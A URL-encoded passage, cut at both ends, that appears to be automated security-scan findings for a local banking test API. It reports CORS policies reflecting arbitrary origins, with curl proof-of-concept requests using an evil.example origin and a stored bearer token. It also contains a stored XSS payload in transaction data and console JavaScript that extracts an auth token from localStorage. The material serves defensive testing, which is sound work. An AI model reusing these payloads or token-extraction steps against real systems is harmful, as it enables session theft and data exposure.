ESPA%20machine-token%20test)%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3A%5C%22REC-BOE-20260908-825C78E6%5C%22%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A51%3A15%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A39%2C%5C%22from_account_id%5C%22%3A6%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22AESPA%20ownership%20test%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A45%3A56%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A38%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22000-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22to_account_id%5C%22%3Anull%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22validation%20probe%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A39%3A27%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A37%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22000-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22to_account_id%5C%22%3Anull%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22validation%20probe%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A38%3A40%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A36%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22to_account_id%5C%22%3A6%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22%3Cimg%20src%3Dx%20onerror%3D%5C%5C%5C%22document.body.dataset.xss009%3D'1'%5C%5C%5C%22%3E%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2012%3A34%3A17%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22from_account_id%5C%22%3A2%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%22200.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Weekend%20spending%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-02-01%2010%3A00%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22033-042%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2256781234%5C%22%2C%5C%22to_account_id%5C%22%3Anull%2C%5C%22amount%5C%22%3A%5C%22150.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Birthday%20gift%20Mum%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22address_book%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Atrue%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-01-20%2014%3A30%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A1%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%22500.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Monthly%20savings%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-01-05%2009%3A12%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A9%2C%5C%22total_pages%5C%22%3A1%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20anonymous%20control%20request%20returned%20401%2C%20so%20the%20transaction%20data%20is%20protected%20by%20Authorization.%20Using%20the%20listed%20admin_test%20session%2C%20the%20same%20request%20with%20Origin%20https%3A%2F%2Fevil.example%20returned%20200%20transaction%20data%20and%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20together%20with%20Access-Control-Allow-Credentials%3A%20true.%20The%20cookie-free%20bearer%20authentication%20limits%20exploitability%20compared%20with%20cookie%20auth%2C%20but%20it%20does%20not%20provide%20a%20benign%20explanation%20for%20the%20confirmed%20arbitrary-origin%20CORS%20policy%20on%20this%20authenticated%20data%20endpoint.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin_test**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin_test%20user%2C%20then%20copy%20that%20user's%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser%20DevTools%20Network%20panel.%20Do%20not%20share%20the%20password.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20reflects%20an%20untrusted%20Origin%20value%20in%20Access-Control-Allow-Origin%20while%20also%20returning%20Access-Control-Allow-Credentials%3A%20true%20and%20allowing%20all%20request%20headers.%22%2C%22impact%22%3A%22A%20malicious%20site%20may%20be%20able%20to%20read%20API%20responses%20in%20a%20victim's%20browser%20if%20the%20application%20uses%20credentials%20that%20browsers%20attach%20cross-origin.%22%2C%22likelihood%22%3A%22Limited%20in%20the%20observed%20context%20because%20the%20request%20used%20an%20Authorization%20header%20and%20no%20cookies.%20No%20browser-based%20sensitive-data%20read%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Use%20an%20explicit%20allowlist%20of%20trusted%20origins%2C%20reject%20unknown%20origins%2C%20disable%20credentialed%20CORS%20where%20unnecessary%2C%20and%20restrict%20allowed%20headers%20and%20methods.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D999%26per_page%3D15%22%2C%22evidence%22%3A%22A%20request%20containing%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%2C%20Access-Control-Allow-Credentials%3A%20true%2C%20and%20Access-Control-Allow-Headers%3A%20*.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D999%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A17%3A14%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20132%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A999%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D999%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A17%3A14%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20132%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A999%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20exact%20endpoint%20reflects%20the%20arbitrary%20Origin%20https%3A%2F%2Fevil.example%20and%20returns%20Access-Control-Allow-Credentials%3A%20true%20and%20Access-Control-Allow-Headers%3A%20*.%20This%20occurred%20on%20an%20anonymous%20401%2C%20on%20an%20authenticated%20admin%20200%20response%2C%20and%20on%20a%20browser-style%20OPTIONS%20preflight%20accepting%20Authorization.%20The%20authenticated%20response%20was%20successful%2C%20so%20the%20behavior%20is%20not%20explained%20by%20an%20error%20handler%20or%20an%20unreachable%20protected%20route.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20test%20user%2C%20then%20copy%20the%20bearer%20value%20from%20the%20Authorization%20header%20in%20the%20browser%20DevTools%20Network%20panel%20and%20supply%20it%20when%20replaying%20the%20request.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20reflects%20an%20untrusted%20Origin%20value%20and%20enables%20credentialed%20cross-origin%20requests.%22%2C%22impact%22%3A%22A%20malicious%20website%20may%20read%20API%20responses%20in%20a%20victim's%20browser%20if%20browser-managed%20credentials%20are%20used.%20The%20probes%20only%20demonstrated%20access%20to%20error%20responses%2C%20so%20sensitive%20data%20exposure%20was%20not%20confirmed.%22%2C%22likelihood%22%3A%22The%20policy%20is%20confirmed%2C%20but%20practical%20impact%20depends%20on%20whether%20sensitive%20endpoints%20use%20cookies%20or%20other%20credentials%20sent%20automatically%20by%20browsers.%22%2C%22recommendation%22%3A%22Allow%20only%20trusted%20origins%2C%20enable%20credentials%20only%20where%20required%2C%20restrict%20allowed%20methods%20and%20headers%2C%20and%20return%20Vary%3A%20Origin%20for%20dynamic%20policies.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D8%26page%3D999%26per_page%3D15%22%2C%22evidence%22%3A%22A%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D8%26page%3D999%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20404%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A19%3A35%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2077%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22NOT_FOUND%5C%22%2C%5C%22message%5C%22%3A%5C%22Account%20not%20found.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D8%26page%3D999%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20404%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A19%3A35%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2077%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22NOT_FOUND%5C%22%2C%5C%22message%5C%22%3A%5C%22Account%20not%20found.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20initial%20evidence%20was%20ambiguous%20because%20it%20showed%20a%20404%20response%20and%20a%20wildcard%20ACAO%20value%2C%20but%20a%20direct%20anonymous%20replay%20confirmed%20the%20server%20changes%20ACAO%20to%20the%20supplied%20Origin.%20I%20then%20used%20the%20supplied%20admin%20session%20and%20a%20valid%20account%20on%20the%20same%20endpoint%3B%20the%20response%20was%20200%20and%20exposed%20transaction%20records%2C%20while%20still%20returning%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%20The%20preflight%20for%20an%20Authorization-bearing%20GET%20also%20returned%20200%20with%20the%20attacker%20origin%2C%20so%20the%20error-only%20and%20non-reflection%20explanations%20do%20not%20hold.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Accept%3A%20application%2Fjson'%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D1%26page%3D1%26per_page%3D15'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%2C%20then%20copy%20the%20Authorization%20bearer%20token%20from%20the%20browser%20DevTools%20Network%20request%20headers%20and%20provide%20it%20when%20replaying%20the%20PoC.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22low%22%2C%22title%22%3A%22Profile%20API%20reflects%20arbitrary%20CORS%20origins%22%2C%22description%22%3A%22The%20API%20reflects%20an%20untrusted%20Origin%20value%20and%20enables%20credentialed%20cross-origin%20requests.%22%2C%22impact%22%3A%22A%20malicious%20website%20may%20be%20able%20to%20read%20API%20responses%20when%20browser-managed%20credentials%20are%20accepted.%20Sensitive%20authenticated%20data%20access%20was%20not%20demonstrated.%22%2C%22likelihood%22%3A%22Limited%20in%20the%20observed%20context%20because%20the%20request%20was%20rejected%20with%20401%20and%20no%20cookies%20were%20present.%22%2C%22recommendation%22%3A%22Allow%20only%20trusted%20origins%2C%20disable%20credentialed%20CORS%20where%20unnecessary%2C%20and%20restrict%20allowed%20headers%20and%20methods.%22%2C%22cvss_score%22%3A3.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%22%2C%22evidence%22%3A%22A%20request%20with%20Origin%3A%20https%3A%2F%2Fevil.example%20received%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%20The%20response%20was%20401%20Invalid%20token%2C%20so%20authenticated%20data%20exposure%20was%20not%20proven.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A22%3A33%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A22%3A33%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20anonymous%20request%20did%20not%20prove%20exposure%2C%20so%20I%20retried%20the%20same%20endpoint%20with%20the%20listed%20admin%20session%20and%20Origin%20https%3A%2F%2Fevil.example.%20The%20server%20returned%20200%20with%20account%20records%2C%20including%20another%20user's%20email%20and%20financial%20account%20data%2C%20while%20returning%20Access-Control-Allow-Origin%3A%20https%3A%2F%2Fevil.example%20and%20Access-Control-Allow-Credentials%3A%20true.%20This%20rules%20out%20the%20benign%20explanation%20that%20the%20headers%20only%20appeared%20on%20an%20unauthorized%20error%3B%20an%20arbitrary%20origin%20can%20make%20credentialed%20reads%20of%20the%20admin%20response.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-H%20'Origin%3A%20https%3A%2F%2Fevil.example'%20'http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20'%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20listed%20admin%20user%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20or%20browser%20storage%20into%20the%20validator%20session.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem(